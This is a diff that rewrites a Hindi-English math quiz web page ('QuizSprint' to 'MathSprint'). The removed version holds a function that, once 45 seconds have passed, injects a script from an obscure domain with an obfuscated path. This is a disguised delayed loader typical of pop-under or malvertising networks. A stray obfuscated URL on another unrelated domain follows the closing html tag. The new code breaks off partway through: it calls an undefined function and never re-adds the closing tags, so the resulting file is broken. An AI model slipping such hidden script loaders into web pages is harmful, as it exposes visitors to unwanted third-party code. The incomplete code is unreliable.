@@ -1,503 +1,1198 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="no-referrer-when-downgrade" />
-    <title>QuizSprint - Math Practice Tool</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MathSprint - Math Practice</title>
 
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+  <style>
+    :root {
+      --cream: #fffaf0;
+      --paper: #fffdf7;
+      --green: #204d46;
+      --green-light: #2b7a67;
+      --orange: #e2784e;
+      --yellow: #e8b53d;
+      --muted: #777463;
+      --border: #e9dfc8;
+      --shadow: 0 20px 45px rgba(68, 56, 27, 0.12);
+    }
 
-        body {
-            background-color: #f0f4f8;
-            color: #333;
-            line-height: 1.6;
-            padding: 20px;
-        }
+    * {
+      box-sizing: border-box;
+    }
 
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: #ffffff;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
+    body {
+      margin: 0;
+      min-width: 320px;
+      color: var(--green);
+      background:
+        radial-gradient(circle at 80% 0%, rgba(255, 231, 179, 0.35), transparent 35%),
+        linear-gradient(135deg, #fffaf0 0%, #fffdf7 55%, #fff2e9 100%);
+      font-family: Inter, Arial, sans-serif;
+    }
 
-        header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+    button,
+    input {
+      font: inherit;
+    }
 
-        h1 {
-            color: #2c3e50;
-            font-size: 1.8rem;
-            margin-bottom: 5px;
-        }
+    button {
+      cursor: pointer;
+    }
 
-        p.subtitle {
-            color: #666;
-            font-size: 0.95rem;
-        }
+    .hidden {
+      display: none !important;
+    }
 
-        .stats-bar {
-            display: flex;
-            justify-content: space-around;
-            background: #e2e8f0;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-weight: bold;
-            font-size: 0.95rem;
-        }
+    .app {
+      min-height: 100vh;
+    }
 
-        .stat-item {
-            text-align: center;
-        }
+    .header {
+      width: 100%;
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 24px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
 
-        .stat-value {
-            font-size: 1.2rem;
-            color: #007bff;
-        }
+    .brand-button {
+      border: 0;
+      background: transparent;
+      padding: 0;
+      color: inherit;
+    }
 
-        .quiz-box {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #e2e8f0;
-        }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+    }
 
-        .question-text {
-            font-size: 1.4rem;
-            font-weight: bold;
-            margin-bottom: 15px;
-            color: #1a202c;
-            text-align: center;
-        }
+    .brand-mark {
+      width: 46px;
+      height: 46px;
+      border-radius: 15px;
+      display: grid;
+      place-items: center;
+      background: var(--green-light);
+      color: #fff9e9;
+      box-shadow: 4px 4px 0 #d8bd68;
+      font-size: 23px;
+      font-weight: 900;
+    }
 
-        .options-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
+    .brand-name {
+      margin: 0;
+      font-size: 22px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      line-height: 1;
+    }
 
-        .option-btn {
-            padding: 12px;
-            font-size: 1.1rem;
-            border: 1px solid #cbd5e0;
-            background: white;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.2s;
-        }
+    .brand-subtitle {
+      margin: 5px 0 0;
+      color: #8c8270;
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
 
-        .option-btn:hover {
-            background: #edf2f7;
-        }
+    .header-message {
+      padding: 10px 16px;
+      border: 1px solid #e5d9ba;
+      border-radius: 999px;
+      color: #766e5e;
+      background: rgba(255, 249, 233, 0.8);
+      font-size: 12px;
+      font-weight: 800;
+    }
 
-        .option-btn.correct {
-            background: #28a745 !important;
-            color: white;
-            border-color: #28a745;
-        }
+    .home-layout {
+      width: 100%;
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 45px 32px 70px;
+      display: grid;
+      grid-template-columns: 1.04fr 0.96fr;
+      gap: 48px;
+      align-items: start;
+    }
 
-        .option-btn.wrong {
-            background: #dc3545 !important;
-            color: white;
-            border-color: #dc3545;
-        }
+    .intro {
+      padding-top: 50px;
+    }
 
-        .time-taken {
-            text-align: center;
-            font-weight: bold;
-            color: #d97706;
-            margin-bottom: 10px;
-            min-height: 24px;
-        }
+    .greeting {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      color: #c17336;
+      font-size: 14px;
+      font-weight: 800;
+    }
 
-        .next-btn {
-            width: 100%;
-            padding: 12px;
-            background: #007bff;
-            color: white;
-            border: none;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-        }
+    .greeting-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #eaa344;
+    }
 
-        .next-btn:hover {
-            background: #0056b3;
-        }
+    .hero-title {
+      max-width: 600px;
+      margin: 26px 0 0;
+      font-size: clamp(52px, 8vw, 106px);
+      line-height: 0.9;
+      letter-spacing: -7px;
+      font-weight: 950;
+    }
 
-        .example-section {
-            margin-top: 25px;
-            padding-top: 15px;
-            border-top: 2px dashed #cbd5e0;
-        }
+    .hero-title .highlight {
+      position: relative;
+      color: var(--orange);
+    }
 
-        .example-section h3 {
-            font-size: 1.1rem;
-            color: #2d3748;
-            margin-bottom: 10px;
-        }
+    .highlight::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: -5px;
+      bottom: -13px;
+      height: 6px;
+      border-radius: 10px;
+      background: var(--yellow);
+      transform: rotate(-2deg);
+    }
 
-        .example-item {
-            background: #edf2f7;
-            padding: 8px 12px;
-            border-radius: 6px;
-            margin-bottom: 8px;
-            font-size: 0.95rem;
-        }
-    </style>
+    .hero-description {
+      max-width: 450px;
+      margin: 34px 0 0;
+      color: #706f63;
+      font-size: 17px;
+      line-height: 1.65;
+    }
+
+    .stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 28px;
+      margin-top: 40px;
+    }
+
+    .stat {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      color: #68695d;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .stat-icon {
+      width: 32px;
+      height: 32px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      color: #c4872b;
+      background: #fff0c7;
+      font-weight: 900;
+    }
+
+    .stat:nth-child(2) .stat-icon {
+      color: var(--green-light);
+      background: #e3f4ec;
+    }
+
+    .stat strong {
+      color: var(--green);
+    }
+
+    .math-decoration {
+      position: relative;
+      height: 100px;
+      max-width: 400px;
+      margin-top: 62px;
+    }
+
+    .shape {
+      position: absolute;
+      display: grid;
+      place-items: center;
+      font-weight: 900;
+      box-shadow: 0 8px 18px rgba(68, 56, 27, 0.1);
+    }
+
+    .shape-plus {
+      left: 16px;
+      top: 10px;
+      width: 66px;
+      height: 66px;
+      border: 2px solid #e9ce6b;
+      border-radius: 17px;
+      color: #a97c16;
+      background: #fff4bc;
+      transform: rotate(-8deg);
+      font-size: 30px;
+    }
+
+    .shape-equals {
+      left: 116px;
+      top: 36px;
+      color: #c67a50;
+      font-size: 25px;
+      box-shadow: none;
+    }
+
+    .shape-win {
+      left: 190px;
+      top: 0;
+      width: 80px;
+      height: 80px;
+      border: 2px solid #abd8c1;
+      border-radius: 24px;
+      color: var(--green-light);
+      background: #e0f5e8;
+      transform: rotate(8deg);
+      font-size: 23px;
+    }
+
+    .topic-panel {
+      position: relative;
+      overflow: hidden;
+      padding: 28px;
+      border: 1px solid var(--border);
+      border-radius: 32px;
+      background: var(--cream);
+      box-shadow: var(--shadow);
+    }
+
+    .dot-grid {
+      position: absolute;
+      inset: 0;
+      opacity: 0.55;
+      pointer-events: none;
+      background-image: radial-gradient(#e5d9bd 1px, transparent 1px);
+      background-size: 17px 17px;
+    }
+
+    .topic-panel-content {
+      position: relative;
+    }
+
+    .panel-heading {
+      display: flex;
+      align-items: end;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .eyebrow {
+      margin: 0;
+      color: #a29a89;
+      font-size: 12px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .panel-title {
+      margin: 5px 0 0;
+      font-size: 30px;
+      line-height: 1.05;
+      letter-spacing: -1.5px;
+      font-weight: 900;
+    }
+
+    .question-count {
+      flex-shrink: 0;
+      padding: 8px 12px;
+      border-radius: 999px;
+      color: var(--green-light);
+      background: #e7f4ed;
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .topics {
+      display: grid;
+      gap: 12px;
+    }
+
+    .topic-button {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 12px;
+      border: 1px solid transparent;
+      border-radius: 18px;
+      text-align: left;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .topic-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 17px rgba(68, 56, 27, 0.1);
+    }
+
+    .topic-button:focus-visible,
+    .main-button:focus-visible,
+    .secondary-button:focus-visible,
+    .back-button:focus-visible,
+    .brand-button:focus-visible,
+    .clear-button:focus-visible {
+      outline: 3px solid #8cc5b0;
+      outline-offset: 3px;
+    }
+
+    .topic-addition {
+      border-color: #f5d1a6;
+      background: #fff0df;
+    }
+
+    .topic-subtraction {
+      border-color: #bed9e9;
+      background: #eaf5fc;
+    }
+
+    .topic-multiplication {
+      border-color: #ecdaa0;
+      background: #fff8d9;
+    }
+
+    .topic-division {
+      border-color: #dec5ea;
+      background: #f7eefd;
+    }
+
+    .topic-bodmas {
+      border-color: #bce5d3;
+      background: #e2f7ee;
+    }
+
+    .operator {
+      width: 40px;
+      height: 40px;
+      flex-shrink: 0;
+      display: grid;
+      place-items: center;
+      border-radius: 13px;
+      font-size: 23px;
+      font-weight: 900;
+    }
+
+    .operator-addition {
+      color: #68351f;
+      background: #f4a261;
+    }
+
+    .operator-subtraction {
+      color: #173e5a;
+      background: #8ab7d9;
+    }
+
+    .operator-multiplication {
+      color: #624d0b;
+      background: #f1c84b;
+    }
+
+    .operator-division {
+      color: #4d2c5c;
+      background: #c29ad7;
+    }
+
+    .operator-bodmas {
+      color: #124f3d;
+      background: #77c8a7;
+    }
+
+    .topic-copy {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .topic-name {
+      display: flex;
+      align-items: baseline;
+      gap: 8px;
+    }
+
+    .topic-name strong {
+      color: #30453f;
+      font-size: 18px;
+    }
+
+    .topic-name span {
+      color: #8b8375;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .topic-description {
+      display: block;
+      margin-top: 3px;
+      color: #7b7d71;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .arrow {
+      color: #9d9a89;
+      font-size: 23px;
+      transition: transform 0.2s ease;
+    }
+
+    .topic-button:hover .arrow {
+      transform: translateX(4px);
+    }
+
+    .panel-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 24px;
+      padding-top: 19px;
+      border-top: 1px solid #ecdfc5;
+      color: #8a8376;
+      font-size: 12px;
+    }
+
+    .clear-button {
+      border: 0;
+      padding: 4px;
+      color: var(--green-light);
+      background: transparent;
+      font-size: 12px;
+      font-weight: 900;
+      text-decoration: underline;
+      text-underline-offset: 4px;
+    }
+
+    .practice-page,
+    .results-page {
+      width: 100%;
+      max-width: 850px;
+      margin: 0 auto;
+      padding: 22px 24px 60px;
+    }
+
+    .practice-page {
+      max-width: 780px;
+    }
+
+    .practice-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 15px;
+      margin: 10px 0 32px;
+    }
+
+    .back-button {
+      border: 0;
+      padding: 9px 4px;
+      color: #777463;
+      background: transparent;
+      font-size: 14px;
+      font-weight: 800;
+    }
+
+    .back-button:hover {
+      color: var(--green);
+    }
+
+    .practice-topic {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      color: #726e61;
+      background: #fff9e9;
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .practice-topic .mini-operator {
+      width: 25px;
+      height: 25px;
+      display: grid;
+      place-items: center;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 900;
+    }
+
+    .progress-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      color: var(--green);
+      font-size: 14px;
+      font-weight: 800;
+    }
+
+    .progress-row span:last-child {
+      color: #c27741;
+    }
+
+    .progress-track {
+      height: 12px;
+      overflow: hidden;
+      border-radius: 99px;
+      background: #e9e3d4;
+    }
+
+    .progress-value {
+      height: 100%;
+      border-radius: inherit;
+      background: var(--yellow);
+      transition: width 0.35s ease;
+    }
+
+    .question-card,
+    .result-card {
+      position: relative;
+      overflow: hidden;
+      margin-top: 25px;
+      padding: 48px;
+      border: 1px solid var(--border);
+      border-radius: 32px;
+      background: var(--cream);
+      box-shadow: var(--shadow);
+    }
+
+    .question-card::before,
+    .result-card::before {
+      content: "";
+      position: absolute;
+      top: -40px;
+      right: -40px;
+      width: 145px;
+      height: 145px;
+      border-radius: 50%;
+      background: rgba(249, 231, 169, 0.5);
+    }
+
+    .question-card::after,
+    .result-card::after {
+      content: "";
+      position: absolute;
+      left: -55px;
+      bottom: -70px;
+      width: 190px;
+      height: 190px;
+      border: 22px solid rgba(228, 242, 232, 0.6);
+      border-radius: 50%;
+    }
+
+    .question-content,
+    .result-content {
+      position: relative;
+      z-index: 1;
+    }
+
+    .question-label {
+      margin: 0 0 22px;
+      color: #a39a86;
+      font-size: 12px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      text-align: center;
+      text-transform: uppercase;
+    }
+
+    .question-expression {
+      margin: 0;
+      color: var(--green);
+      font-size: clamp(56px, 12vw, 125px);
+      line-height: 1;
+      letter-spacing: -6px;
+      font-weight: 950;
+      text-align: center;
+    }
+
+    .answer-form {
+      max-width: 420px;
+      margin: 45px auto 0;
+    }
+
+    .answer-label {
+      display: block;
+      margin-bottom: 8px;
+      color: #777463;
+      font-size: 14px;
+      font-weight: 800;
+      text-align: center;
+    }
+
+    .answer-input {
+      width: 100%;
+      height: 74px;
+      border: 2px solid #dbd2bd;
+      border-radius: 17px;
+      color: var(--green);
+      background: #fffdf7;
+      font-size: 38px;
+      font-weight: 900;
+      text-align: center;
+      box-shadow: inset 0 2px 8px rgba(75, 67, 41, 0.04);
+    }
+
+    .answer-input:focus {
+      outline: none;
+      border-color: #4a9b83;
+      box-shadow: 0 0 0 4px rgba(74, 155, 131, 0.15);
+    }
+
+    .answer-input:disabled {
+      opacity: 0.7;
+    }
+
+    .answer-input::placeholder {
+      color: #c8c0ae;
+    }
+
+    .answer-help {
+      margin: 12px 0 0;
+      color: #a19a89;
+      font-size: 12px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .main-button,
+    .secondary-button {
+      min-height: 55px;
+      border-radius: 16px;
+      font-weight: 900;
+      transition: transform 0.2s ease, background 0.2s ease;
+    }
+
+    .main-button {
+      width: 100%;
+      margin-top: 24px;
+      border: 0;
+      color: #fff9e9;
+      background: var(--green-light);
+      box-shadow: 0 5px 0 #185746;
+    }
+
+    .main-button:hover {
+      background: #236d5b;
+      transform: translateY(-2px);
+    }
+
+    .main-button:active {
+      transform: translateY(2px);
+      box-shadow: none;
+    }
+
+    .main-button:disabled {
+      cursor: not-allowed;
+      opacity: 0.4;
+      transform: none;
+    }
+
+    .feedback {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      max-width: 420px;
+      margin: 25px auto 0;
+      padding: 16px;
+      border-radius: 16px;
+      border: 1px solid;
+    }
+
+    .feedback.correct {
+      border-color: #b8dfc7;
+      background: #e9f8ef;
+    }
+
+    .feedback.incorrect {
+      border-color: #f1c7b6;
+      background: #fff0e7;
+    }
+
+    .feedback-icon {
+      width: 32px;
+      height: 32px;
+      flex-shrink: 0;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      color: white;
+      font-weight: 900;
+    }
+
+    .correct .feedback-icon {
+      background: #2b9472;
+    }
+
+    .incorrect .feedback-icon {
+      background: #d47757;
+    }
+
+    .feedback-title {
+      margin: 2px 0 0;
+      font-weight: 900;
+    }
+
+    .correct .feedback-title {
+      color: #236e56;
+    }
+
+    .incorrect .feedback-title {
+      color: #a34e37;
+    }
+
+    .feedback-text {
+      margin: 5px 0 0;
+      color: #7a7569;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    .result-card {
+      margin-top: 30px;
+      padding: 54px;
+      text-align: center;
+    }
+
+    .result-badge {
+      position: relative;
+      z-index: 1;
+      width: 82px;
+      height: 82px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 24px;
+      border-radius: 26px;
+      color: #624d0b;
+      background: #f1c84b;
+      font-size: 34px;
+      font-weight: 900;
+      box-shadow: 0 8px 18px rgba(68, 56, 27, 0.1);
+    }
+
+    .result-eyebrow,
+    .result-title,
+    .result-description {
+      position: relative;
+      z-index: 1;
+    }
+
+    .result-eyebrow {
+      margin: 0;
+      color: #a39a86;
+      font-size: 12px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .result-title {
+      max-width: 650px;
+      margin: 13px auto 0;
+      color: var(--green);
+      font-size: clamp(40px, 7vw, 75px);
+      line-height: 0.95;
+      letter-spacing: -4px;
+      font-weight: 950;
+    }
+
+    .result-description {
+      margin: 18px 0 0;
+      color: #777463;
+      font-weight: 600;
+    }
+
+    .result-summary {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 45px;
+      margin-top: 42px;
+    }
+
+    .score-circle {
+      width: 160px;
+      height: 160px;
+      display: grid;
+      place-items: center;
+      border: 13px solid #ebe3d0;
+      border-top-color: var(--green-light);
+      border-right-color: var(--green-light);
+      border-radius: 50%;
+    }
+
+    .score-number {
+      margin: 0;
+      color: var(--green);
+      font-size: 48px;
+      font-weight: 950;
+    }
+
+    .score-number span {
+      color: #a6a090;
+      font-size: 22px;
+    }
+
+    .score-label {
+      margin: 3px 0 0;
+      color: #928b7c;
+      font-size: 11px;
+      font-weight: 900;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .result-stats {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      text-align: left;
+    }
+
+    .result-stat {
+      min-width: 115px;
+      padding: 13px 15px;
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      background: #fffdf7;
+    }
+
+    .result-stat-label {
+      margin: 0;
+      color: #a39a86;
+      font-size: 11px;
+      font-weight: 900;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .result-stat-value {
+      margin: 5px 0 0;
+      color: var(--green-light);
+      font-size: 20px;
+      font-weight: 900;
+    }
+
+    .answers-review {
+      position: relative;
+      z-index: 1;
+      margin-top: 42px;
+      padding-top: 24px;
+      border-top: 1px solid #eadfc8;
+      text-align: left;
+    }
+
+    .review-title {
+      margin: 0 0 13px;
+      color: #a39a86;
+      font-size: 12px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .review-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 8px;
+    }
+
+    .review-item {
+      padding: 10px;
+      border: 1px solid;
+      border-radius: 12px;
+    }
+
+    .review-item.correct {
+      border-color: #bde0ca;
+      background: #eaf7ef;
+    }
+
+    .review-item.incorrect {
+      border-color: #f0cbbb;
+      background: #fff0e7;
+    }
+
+    .review-question {
+      margin: 6px 0 0;
+      overflow: hidden;
+      color: #3d5049;
+      font-size: 13px;
+      font-weight: 900;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .review-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #766f61;
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    .result-actions {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 36px;
+    }
+
+    .secondary-button {
+      min-width: 205px;
+      padding: 0 20px;
+      border: 2px solid #d9cfb8;
+      color: #46675d;
+      background: #fffdf7;
+    }
+
+    .secondary-button:hover {
+      border-color: #78bba2;
+      background: #eaf7ef;
+    }
+
+    .result-footer {
+      margin: 22px 0 0;
+      color: #8b8577;
+      font-size: 14px;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    @media (max-width: 850px) {
+      .header {
+        padding: 20px;
+      }
+
+      .header-message {
+        display: none;
+      }
+
+      .home-layout {
+        grid-template-columns: 1fr;
+        gap: 25px;
+        padding: 20px 20px 45px;
+      }
+
+      .intro {
+        padding-top: 15px;
+      }
+
+      .hero-title {
+        letter-spacing: -4px;
+      }
+
+      .math-decoration {
+        display: none;
+      }
+
+      .topic-panel {
+        padding: 22px;
+      }
+
+      .question-card,
+      .result-card {
+        padding: 30px 22px;
+      }
+
+      .result-summary {
+        flex-direction: column;
+        gap: 26px;
+      }
+    }
+
+    @media (max-width: 560px) {
+      .brand-name {
+        font-size: 19px;
+      }
+
+      .brand-mark {
+        width: 42px;
+        height: 42px;
+      }
+
+      .panel-heading {
+        align-items: flex-start;
+        flex-direction: column;
+      }
+
+      .topic-name strong {
+        font-size: 16px;
+      }
+
+      .practice-page,
+      .results-page {
+        padding: 12px 16px 45px;
+      }
+
+      .practice-topbar {
+        align-items: flex-start;
+        flex-direction: column;
+        margin-bottom: 24px;
+      }
+
+      .question-expression {
+        font-size: 55px;
+        letter-spacing: -3px;
+      }
+
+      .review-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .result-actions {
+        flex-direction: column;
+      }
+
+      .secondary-button {
+        width: 100%;
+      }
+    }
+  </style>
 </head>
 
 <body>
+  <div id="app" class="app"></div>
 
-<div class="container">
+  <script>
+    const SESSION_LENGTH = 5;
+    const HISTORY_KEY = "mathsprint-history";
 
-    <header>
-        <h1>🧮 Math Practice Sprint</h1>
-        <p class="subtitle">जोड़, घटाव, गुणा और भाग का लाइव टेस्ट!</p>
-    </header>
+    const topics = [
+      {
+        key: "addition",
+        label: "Addition",
+        hindi: "जोड़",
+        description: "Put numbers together",
+        prompt: "Add it up",
+        operator: "+",
+        topicClass: "topic-addition",
+        operatorClass: "operator-addition"
+      },
+      {
+        key: "subtraction",
+        label: "Subtraction",
+        hindi: "घटाव",
+        description: "Find what is left",
+        prompt: "Take it away",
+        operator: "−",
+        topicClass: "topic-subtraction",
+        operatorClass: "operator-subtraction"
+      },
+      {
+        key: "multiplication",
+        label: "Multiplication",
+        hindi: "गुणा",
+        description: "Make equal groups",
+        prompt: "Groups of numbers",
+        operator: "×",
+        topicClass: "topic-multiplication",
+        operatorClass: "operator-multiplication"
+      },
+      {
+        key: "division",
+        label: "Division",
+        hindi: "भाग",
+        description: "Share equally",
+        prompt: "Share the whole",
+        operator: "÷",
+        topicClass: "topic-division",
+        operatorClass: "operator-division"
+      },
+      {
+        key: "bodmas",
+        label: "BODMAS",
+        hindi: "क्रम",
+        description: "Think in the right order",
+        prompt: "Order matters",
+        operator: "[]",
+        topicClass: "topic-bodmas",
+        operatorClass: "operator-bodmas"
+      }
+    ];
 
-    <div class="stats-bar">
+    let state = {
+      view: "home",
+      selectedTopic: "addition",
+      question: null,
+      questionNumber: 1,
+      answer: "",
+      feedback: null,
+      attempts: [],
+      history: readHistory()
+    };
 
-        <div class="stat-item">
-            कुल प्रश्न<br>
-            <span id="total-count" class="stat-value">0</span>
-        </div>
-
-        <div class="stat-item">
-            सही (Correct)<br>
-            <span id="correct-count"
-                  class="stat-value"
-                  style="color: #28a745;">
-                0
-            </span>
-        </div>
-
-        <div class="stat-item">
-            गलत (Wrong)<br>
-            <span id="wrong-count"
-                  class="stat-value"
-                  style="color: #dc3545;">
-                0
-            </span>
-        </div>
-
-    </div>
-
-    <div class="quiz-box">
-
-        <div class="question-text" id="question">
-            Loading Question...
-        </div>
-
-        <div class="options-grid" id="options-container"></div>
-
-        <div class="time-taken" id="time-display">
-            ⏱️ उत्तर देने का समय: -- सेकंड
-        </div>
-
-        <button class="next-btn" onclick="handleNextClick()">
-            अगला प्रश्न (Next Question) ➡️
-        </button>
-
-    </div>
-
-    <div class="example-section">
-
-        <h3>💡 गणित के कुछ उदाहरण:</h3>
-
-        <div class="example-item">
-            <b>1. जोड़ (Addition):</b> 45 + 55 = 100
-        </div>
-
-        <div class="example-item">
-            <b>2. घटाव (Subtraction):</b> 120 - 40 = 80
-        </div>
-
-        <div class="example-item">
-            <b>3. गुणा (Multiplication):</b> 15 × 6 = 90
-        </div>
-
-        <div class="example-item">
-            <b>4. भाग (Division):</b> 100 ÷ 5 = 20
-        </div>
-
-    </div>
-
-</div>
-
-<script>
-
-    let correctAnswer = null;
-    let startTime = null;
-
-    let totalQuestions = 0;
-    let correctAnswers = 0;
-    let wrongAnswers = 0;
-
-    let pageLoadTime = Date.now();
-    let adTriggered = false;
-
-    function triggerAdScript() {
-
-        if (!adTriggered) {
-
-            adTriggered = true;
-
-            var d = document,
-                s = d.createElement('script'),
-                l = d.scripts[d.scripts.length - 1];
-
-            s.settings = {};
-
-            s.src =
-                "//windy-imagination.com/cGDA9l/Gqb.2a50l-5xW/QbIDN/rUWT2/NvjtUcxGWFyUDD3/MzNY/2oN/Tw1PxT";
-
-            s.async = true;
-
-            s.referrerPolicy =
-                'no-referrer-when-downgrade';
-
-            l.parentNode.insertBefore(s, l);
-        }
+    function randomInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
     }
 
-    function handleNextClick() {
-
-        let currentTime = Date.now();
-
-        if (currentTime - pageLoadTime >= 45000) {
-            triggerAdScript();
-        }
-
-        generateQuestion();
-    }
-
-    function getRandomInt(min, max) {
-
-        return Math.floor(
-            Math.random() * (max - min + 1)
-        ) + min;
-    }
-
-    function generateQuestion() {
-
-        const qElement =
-            document.getElementById('question');
-
-        const optContainer =
-            document.getElementById('options-container');
-
-        const timeDisplay =
-            document.getElementById('time-display');
-
-        optContainer.innerHTML = '';
-
-        timeDisplay.innerText =
-            '⏱️ समय चालू है...';
-
-        const type = getRandomInt(0, 4);
-
-        let num1, num2, num3, qText;
-
-        if (type === 0) {
-
-            num1 = getRandomInt(1, 100);
-            num2 = getRandomInt(1, 100);
-
-            qText =
-                `Solve: ${num1} + ${num2} = ?`;
-
-            correctAnswer =
-                num1 + num2;
-
-        } else if (type === 1) {
-
-            num1 = getRandomInt(50, 150);
-            num2 = getRandomInt(1, 50);
-
-            qText =
-                `Solve: ${num1} - ${num2} = ?`;
-
-            correctAnswer =
-                num1 - num2;
-
-        } else if (type === 2) {
-
-            num1 = getRandomInt(2, 20);
-            num2 = getRandomInt(2, 15);
-
-            qText =
-                `Solve: ${num1} × ${num2} = ?`;
-
-            correctAnswer =
-                num1 * num2;
-
-        } else if (type === 3) {
-
-            num2 = getRandomInt(2, 12);
-
-            correctAnswer =
-                getRandomInt(2, 15);
-
-            num1 =
-                num2 * correctAnswer;
-
-            qText =
-                `Solve: ${num1} ÷ ${num2} = ?`;
-
-        } else {
-
-            num1 = getRandomInt(2, 10);
-            num2 = getRandomInt(2, 10);
-            num3 = getRandomInt(2, 5);
-
-            qText =
-                `Solve: (${num1} + ${num2}) × ${num3} = ?`;
-
-            correctAnswer =
-                (num1 + num2) * num3;
-        }
-
-        qElement.innerText = qText;
-
-        createOptions(correctAnswer);
-
-        startTime = new Date();
-    }
-
-    function createOptions(correct) {
-
-        const optContainer =
-            document.getElementById('options-container');
-
-        let options = [correct];
-
-        while (options.length < 4) {
-
-            let wrong =
-                correct + getRandomInt(-10, 10);
-
-            if (
-                wrong !== correct &&
-                wrong >= 0 &&
-                !options.includes(wrong)
-            ) {
-                options.push(wrong);
-            }
-        }
-
-        options.sort(
-            () => Math.random() - 0.5
-        );
-
-        options.forEach(opt => {
-
-            const btn =
-                document.createElement('button');
-
-            btn.className =
-                'option-btn';
-
-            btn.innerText = opt;
-
-            btn.onclick = () =>
-                checkAnswer(btn, opt);
-
-            optContainer.appendChild(btn);
-        });
-    }
-
-    function checkAnswer(btn, selected) {
-
-        const endTime = new Date();
-
-        const secondsTaken =
-            ((endTime - startTime) / 1000)
-            .toFixed(1);
-
-        document.getElementById(
-            'time-display'
-        ).innerText =
-            `⏱️ आपने यह सवाल ${secondsTaken} सेकंड में हल किया!`;
-
-        const allBtns =
-            document.querySelectorAll('.option-btn');
-
-        allBtns.forEach(
-            b => b.disabled = true
-        );
-
-        totalQuestions++;
-
-        if (selected == correctAnswer) {
-
-            btn.classList.add('correct');
-
-            correctAnswers++;
-
-        } else {
-
-            btn.classList.add('wrong');
-
-            wrongAnswers++;
-
-            allBtns.forEach(b => {
-
-                if (
-                    b.innerText == correctAnswer
-                ) {
-                    b.classList.add('correct');
-                }
-
-            });
-        }
-
-        document.getElementById(
-            'total-count'
-        ).innerText = totalQuestions;
-
-        document.getElementById(
-            'correct-count'
-        ).innerText = correctAnswers;
-
-        document.getElementById(
-            'wrong-count'
-        ).innerText = wrongAnswers;
-    }
-
-    generateQuestion();
-
-</script>
-
-</body>
-</html>
-https://bold-consequence.com/bx3RV.0HPp3Epovbbfm/VhJ/ZdDI0w3CM/zkYv2uNITcEa3gLaT-c/zHNIjnYy1mMrjWEI
